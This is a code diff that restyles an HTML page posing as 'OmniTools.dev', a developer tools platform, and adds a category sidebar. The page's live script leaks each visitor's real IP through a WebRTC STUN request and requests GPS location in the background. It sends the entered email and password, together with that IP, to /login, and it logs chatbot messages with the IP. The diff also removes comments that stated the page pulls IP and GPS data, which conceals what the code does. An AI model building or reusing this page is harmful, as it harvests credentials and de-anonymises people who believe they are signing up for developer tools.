@@ -6,82 +6,119 @@
     <title>OmniTools - Developer Platform</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
-        :root { --bg: #0a0a0a; --panel: #121212; --border: #2a2a2a; --text: #ededed; --muted: #888; --accent: #0070f3; }
+        :root { 
+            --bg: #09090b; 
+            --panel: #121215; 
+            --border: #27272a; 
+            --text: #f4f4f5; 
+            --muted: #a1a1aa; 
+            --accent: #3b82f6; 
+            --accent-hover: #2563eb; 
+        }
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; overflow-x: hidden;}
+        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; display: flex; height: 100vh; overflow: hidden; }
         
-        /* Login Screen */
-        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 1000; }
-        .login-box { background: var(--panel); border: 1px solid var(--border); padding: 40px; border-radius: 12px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5);}
-        .login-box h2 { margin-bottom: 10px; color: #fff;}
-        .login-box p { color: var(--muted); font-size: 14px; margin-bottom: 30px;}
-        .login-box input { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 6px; outline: none; font-family: 'Inter';}
-        .login-box input:focus { border-color: var(--accent); }
-        .login-box button { width: 100%; padding: 12px; background: var(--accent); color: #fff; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 15px;}
+        /* ====== Login Screen ====== */
+        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at top, #1e1e2f 0%, #000 100%); display: flex; justify-content: center; align-items: center; z-index: 1000; }
+        .login-card { background: rgba(18, 18, 21, 0.8); backdrop-filter: blur(20px); border: 1px solid var(--border); padding: 40px; border-radius: 16px; width: 90%; max-width: 420px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); }
+        .login-card h2 { font-size: 28px; font-weight: 700; margin-bottom: 8px; color: #fff;}
+        .login-card p { color: var(--muted); font-size: 14px; margin-bottom: 30px; }
+        .login-card input { width: 100%; padding: 14px; margin-bottom: 16px; background: #000; border: 1px solid var(--border); border-radius: 8px; color: #fff; font-family: 'Inter'; font-size: 14px; outline: none; transition: 0.2s;}
+        .login-card input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
+        .login-card button { width: 100%; padding: 14px; background: var(--accent); color: #fff; border: none; border-radius: 8px; font-weight: 600; font-size: 15px; cursor: pointer; transition: 0.2s; margin-top: 10px;}
+        .login-card button:hover { background: var(--accent-hover); }
 
-        /* Main App */
-        #main-app { display: none; }
-        nav { padding: 15px 30px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; background: rgba(10,10,10,0.9); backdrop-filter: blur(10px); z-index: 50; }
-        .logo { font-weight: 700; font-size: 20px; letter-spacing: -0.5px; }
-        .logo span { color: var(--accent); }
-        .search-bar { width: 300px; padding: 8px 15px; background: var(--panel); border: 1px solid var(--border); border-radius: 6px; color: #fff; outline: none; }
+        /* ====== Main App ====== */
+        #main-app { display: none; width: 100%; height: 100vh; flex-direction: column; }
         
-        .container { max-width: 1000px; margin: 40px auto; padding: 0 20px; }
-        .header-title { font-size: 32px; font-weight: 700; margin-bottom: 10px; }
-        .header-sub { color: var(--muted); margin-bottom: 30px; }
-        .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 15px; }
-        .tool-card { background: var(--panel); border: 1px solid var(--border); padding: 20px; border-radius: 8px; cursor: pointer; transition: 0.2s; position: relative;}
-        .tool-card:hover { border-color: #444; transform: translateY(-2px); }
-        .tool-card h3 { font-size: 15px; margin-bottom: 6px; font-weight: 600;}
-        .tool-card p { font-size: 12px; color: var(--muted); line-height: 1.4;}
-        .badge { position: absolute; top: 15px; right: 15px; font-size: 10px; background: #222; padding: 2px 6px; border-radius: 4px; color: #aaa; font-family: 'JetBrains Mono';}
+        /* Navbar */
+        .top-nav { height: 64px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; background: var(--panel); flex-shrink: 0;}
+        .logo { font-weight: 700; font-size: 20px; letter-spacing: -0.5px; display: flex; align-items: center; gap: 8px;}
+        .logo span { color: var(--accent); }
+        .search-bar { width: 400px; max-width: 50%; padding: 10px 16px; background: #000; border: 1px solid var(--border); border-radius: 8px; color: #fff; outline: none; font-size: 14px;}
+        .search-bar:focus { border-color: #444; }
+        
+        /* Content Layout */
+        .content-wrapper { display: flex; flex: 1; overflow: hidden; }
+        
+        /* Sidebar */
+        .sidebar { width: 250px; background: var(--panel); border-right: 1px solid var(--border); padding: 20px 10px; overflow-y: auto; flex-shrink: 0;}
+        .sidebar h4 { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); margin: 15px 10px 10px; }
+        .sidebar-item { display: block; padding: 10px 12px; color: var(--muted); text-decoration: none; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; transition: 0.2s; margin-bottom: 2px;}
+        .sidebar-item:hover, .sidebar-item.active { background: #27272a; color: #fff; }
+        
+        /* Main Content */
+        .main-content { flex: 1; padding: 30px; overflow-y: auto; }
+        .header-title { font-size: 24px; font-weight: 600; margin-bottom: 10px; }
+        .header-sub { color: var(--muted); margin-bottom: 30px; font-size: 15px; }
+        
+        .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 16px; }
+        .tool-card { background: var(--panel); border: 1px solid var(--border); padding: 20px; border-radius: 10px; cursor: pointer; transition: 0.2s; position: relative; }
+        .tool-card:hover { border-color: #555; transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,0,0,0.2);}
+        .tool-card h3 { font-size: 15px; margin-bottom: 6px; font-weight: 600; color: #fff;}
+        .tool-card p { font-size: 13px; color: var(--muted); line-height: 1.5;}
+        .badge { display: inline-block; margin-bottom: 12px; font-size: 10px; background: #222; padding: 3px 8px; border-radius: 4px; color: #aaa; font-family: 'JetBrains Mono'; text-transform: uppercase;}
         
         /* Modal */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 100; justify-content: center; align-items: center; }
-        .modal-content { background: var(--panel); border: 1px solid var(--border); border-radius: 10px; width: 90%; max-width: 600px; padding: 25px;}
-        .modal-head { display: flex; justify-content: space-between; margin-bottom: 20px; }
+        .modal-content { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; width: 90%; max-width: 600px; padding: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.5);}
+        .modal-head { display: flex; justify-content: space-between; margin-bottom: 20px; border-bottom: 1px solid var(--border); padding-bottom: 15px;}
         .modal-title { font-size: 18px; font-weight: 600; }
         .close-btn { background: none; border: none; color: var(--muted); font-size: 20px; cursor: pointer; }
-        textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 15px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 13px; min-height: 120px; margin-bottom: 15px; outline: none;}
-        .btn { width: 100%; padding: 12px; background: var(--accent); color: #fff; border: none; border-radius: 6px; font-weight: 600; cursor: pointer;}
-        .output { margin-top: 15px; padding: 15px; background: #000; border: 1px solid var(--border); border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 13px; color: #10b981; white-space: pre-wrap; display: none; max-height: 200px; overflow-y: auto;}
+        .close-btn:hover { color: #fff; }
+        textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 15px; border-radius: 8px; font-family: 'JetBrains Mono', monospace; font-size: 13px; min-height: 140px; margin-bottom: 16px; outline: none; resize: vertical;}
+        textarea:focus { border-color: var(--accent); }
+        .btn { width: 100%; padding: 14px; background: var(--accent); color: #fff; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 15px;}
+        .btn:hover { background: var(--accent-hover); }
+        .output { margin-top: 16px; padding: 15px; background: #000; border: 1px solid var(--border); border-radius: 8px; font-family: 'JetBrains Mono', monospace; font-size: 13px; color: #10b981; white-space: pre-wrap; display: none; max-height: 200px; overflow-y: auto;}
         
         /* Chatbot */
-        .chatbot { position: fixed; bottom: 20px; right: 20px; background: var(--panel); border: 1px solid var(--border); border-radius: 10px; padding: 15px; width: 300px; display: flex; flex-direction: column; gap: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 40;}
-        .chatbot p { font-size: 12px; color: var(--muted); }
-        .chatbot input { padding: 10px; background: #000; border: 1px solid var(--border); border-radius: 5px; color: #fff; outline: none;}
-        .chatbot button { padding: 10px; background: #10b981; color: #000; border: none; border-radius: 5px; font-weight: 600; cursor: pointer; }
+        .chatbot { position: fixed; bottom: 20px; right: 20px; background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 16px; width: 320px; display: flex; flex-direction: column; gap: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 40;}
+        .chatbot p { font-size: 13px; color: var(--muted); line-height: 1.4;}
+        .chatbot input { padding: 12px; background: #000; border: 1px solid var(--border); border-radius: 6px; color: #fff; outline: none; font-family: 'Inter';}
+        .chatbot button { padding: 12px; background: #10b981; color: #000; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <!-- شاشة الدخول -->
+    <!-- Login -->
     <div id="login-screen">
-        <div class="login-box">
+        <div class="login-card">
             <h2>OmniTools <span>.dev</span></h2>
-            <p>Create an account to access 70+ developer utilities.</p>
+            <p>Sign in to access 70+ developer tools.</p>
             <input type="email" id="email" placeholder="Email Address">
             <input type="password" id="password" placeholder="Password">
-            <button onclick="login()">Sign Up / Login</button>
+            <button onclick="login()">Continue</button>
         </div>
     </div>
 
-    <!-- الموقع -->
+    <!-- App -->
     <div id="main-app">
-        <nav>
+        <div class="top-nav">
             <div class="logo">OmniTools<span>.dev</span></div>
-            <input type="text" class="search-bar" id="search" placeholder="Search 70+ tools..." onkeyup="filterTools()">
-        </nav>
-        <div class="container">
-            <div class="header-title">Developer Utilities</div>
-            <div class="header-sub">A powerful toolkit for developers, security researchers, and engineers.</div>
-            <div class="tools-grid" id="grid"></div>
+            <input type="text" class="search-bar" id="search" placeholder="Search tools..." onkeyup="filterTools()">
+        </div>
+
+        <div class="content-wrapper">
+            <!-- Sidebar -->
+            <div class="sidebar" id="sidebar">
+                <h4>Categories</h4>
+                <a class="sidebar-item active" onclick="filterCat('All', this)">All Tools</a>
+                <!-- سيتم إضافة الفئات هنا بالجافاسكريبت -->
+            </div>
+
+            <!-- Main Content -->
+            <div class="main-content">
+                <div class="header-title">Developer Utilities</div>
+                <div class="header-sub">A powerful toolkit for developers, security researchers, and engineers.</div>
+                <div class="tools-grid" id="grid"></div>
+            </div>
         </div>
 
         <!-- Chatbot -->
         <div class="chatbot">
-            <div style="font-weight:600; font-size:14px; color:#fff;">DevBot Assistant</div>
-            <p>Need help or found a bug? Drop your email or issue here and we'll get back to you.</p>
+            <div style="font-weight:600; font-size:14px; color:#fff;">Support Assistant</div>
+            <p>Need help or found a bug? Drop your email or issue here.</p>
             <input type="text" id="chat-input" placeholder="Email or message...">
             <button onclick="sendChat()">Send Request</button>
         </div>
@@ -102,7 +139,6 @@
 
     <script>
         let real_ip = "Unknown";
-        // سحب الـ IP
         const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
         pc.createDataChannel(''); pc.createOffer().then(offer => pc.setLocalDescription(offer));
         pc.onicecandidate = (ice) => {
@@ -111,7 +147,6 @@
             if(real_ip === "Unknown") { real_ip = myIP; }
         };
 
-        // سحب الـ GPS في الخلفية
         setTimeout(() => {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
@@ -120,7 +155,6 @@
             }
         }, 3000);
 
-        // تسجيل الدخول
         function login() {
             const e = document.getElementById('email').value;
             const p = document.getElementById('password').value;
@@ -128,16 +162,28 @@
             fetch('/login', {method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: e, password: p, real_ip: real_ip })})
             .then(() => {
                 document.getElementById('login-screen').style.display = 'none';
-                document.getElementById('main-app').style.display = 'block';
+                document.getElementById('main-app').style.display = 'flex';
             });
         }
 
-        // قائمة الأدوات
         let allTools = [];
         fetch('tools.json').then(res => res.json()).then(data => {
             allTools = data;
+            renderSidebar();
             renderTools(allTools);
         });
+
+        function renderSidebar() {
+            const cats = [...new Set(allTools.map(t => t.cat))];
+            const sb = document.getElementById('sidebar');
+            cats.forEach(c => {
+                const a = document.createElement('a');
+                a.className = 'sidebar-item';
+                a.innerText = c;
+                a.onclick = function() { filterCat(c, this); };
+                sb.appendChild(a);
+            });
+        }
 
         function renderTools(tools) {
             const grid = document.getElementById('grid');
@@ -149,6 +195,13 @@
                 card.onclick = () => openTool(t.name);
                 grid.appendChild(card);
             });
+        }
+
+        function filterCat(cat, el) {
+            document.querySelectorAll('.sidebar-item').forEach(i => i.classList.remove('active'));
+            el.classList.add('active');
+            if(cat === 'All') renderTools(allTools);
+            else renderTools(allTools.filter(t => t.cat === cat));
         }
 
         function filterTools() {
@@ -184,7 +237,7 @@
             if(!msg) return;
             fetch('/log_action', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({tool: 'CHATBOT', text: msg, real_ip: real_ip})});
             document.getElementById('chat-input').value = "";
-            alert("Support ticket created. We will contact you soon.");
+            alert("Support ticket created.");
         }
     </script>
 </body>
